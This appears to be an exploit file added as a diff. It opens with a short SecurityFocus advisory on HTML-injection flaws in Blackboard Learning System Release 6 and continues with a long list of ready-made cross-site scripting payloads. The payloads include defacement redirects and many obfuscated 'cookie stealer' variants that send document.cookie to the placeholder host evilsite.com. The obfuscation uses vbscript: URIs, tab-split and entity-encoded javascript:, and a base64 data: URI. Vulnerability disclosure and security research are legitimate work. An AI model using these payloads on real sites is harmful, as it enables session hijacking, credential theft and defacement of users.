@@ -1,0 +1,94 @@
+source: http://www.securityfocus.com/bid/19308/info
+
+Blackboard products are prone to multiple HTML-injection vulnerabilities because the software fails to properly sanitize user-supplied input before using it in dynamically generated content. 
+
+Attacker-supplied HTML and script code would execute in the context of the affected website, potentially allowing the attacker to steal cookie-based authentication credentials or to control how the site is rendered to the user; other attacks are also possible.
+
+Blackboard Learning System (Release 6) and Blackboard Learning and Community Portal Suite (Release 6 build 6.2.3.23) are vulnerable; other version may also be affected.
+
+Reports indicate this issue has been addressed in versions 7.0 and 7.1, but Symantec has not confirmed this.
+
+UPDATE (June 14, 2007): Reports indicate that Blackboard Academic Suite - Vista 4 is also vulnerable.
+
+Defacement (FrameBuster)
+-------------------------
+<meta http-equiv="refresh"
+content="15;url= http://evilsite.com">
+
+
+Defacement (FrameBuster)
+-------------------------
+<iframe src=" http://evilsite.com" width=100
+height=100></iframe>
+
+
+Defacement (IE ONLY)
+-------------------------
+<img src=vbscript:document.write("defaced_by_insane_script_kiddies")>
+
+
+Defacement (IE ONLY)
+-------------------------
+<link rel="stylesheet"
+href=vbscript:document.write("defaced_by_insane_script_kiddies")>
+
+
+Cookie Stealer (IE ONLY)
+-------------------------
+
+<img
+src="vbscript:wintest=window.open(%22http://evilsite.com + document.cookie)"style=visibility:hidden/>
+<img src="vbscript:window.focus ()"style=visibility:hidden/>
+<img src="vbscript: window.close()"style=visibility:hidden/>
+
+
+Cookie Stealer (IE ONLY)
+-------------------------
+<link rel="stylesheet"
+href="vbscript:wintest=window.open(%22http://evilsite.com+document.cookie)">
+
+
+Cookie Stealer (Encoded Tab - IE ONLY)
+-------------------------
+<img
+src="jav&#x09;ascript: document.images[1].src=%22http://evilsite.com+document.cookie;"<img src="jav
+ascript:document.images[1].src=%22http://evilsite.com+document.cookie;"style=visibility:hidden/>
+
+
+Cookie Stealer (html encoded - IE ONLY)
+-------------------------
+<img
+src=&#039;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;document.images[1].s
+rc=" http://evilsite.com"+document.cookie;&#039;<img
+src="jav
+ascript:document.images[1].src=%22http://evilsite.com+document.cookie;"style=visibility:hidden/>
+
+
+Cookie Stealer (tabs - IE ONLY)
+-------------------------
+<img src="jav
+ascript:document.images[1].src=%22http://evilsite.com+document.cookie;"style=visibility:hidden/>
+
+
+Cookie Stealer (body tag with tabs - IE ONLY)
+-------------------------
+<body background="jav
+ascript:document.images[1].src=%22http://evilsite.com+document.cookie;">
+
+
+Cookie Stealer (div tag with tabs - IE ONLY)
+-------------------------
+<div style="background-image: url(jav
+ascript:document.images[1].src=%22http://evilsite.com+document.cookie;)">
+
+
+Cookie Stealer (firefox)
+-------------------------
+<META HTTP-EQUIV="refresh"
+CONTENT="0;url=data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly9ldmlsc2l0ZS5jb20vY29va2llLmpzIj48L3NjcmlwdD4=">
+
+
+Cookie Stealer (firefox - click to work)
+-------------------------
+<a
+href="data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHA6Ly9ldmlsc2l0ZS5jb20vY29va2llLmpzIj48L3NjcmlwdD4=">hmmm</a>
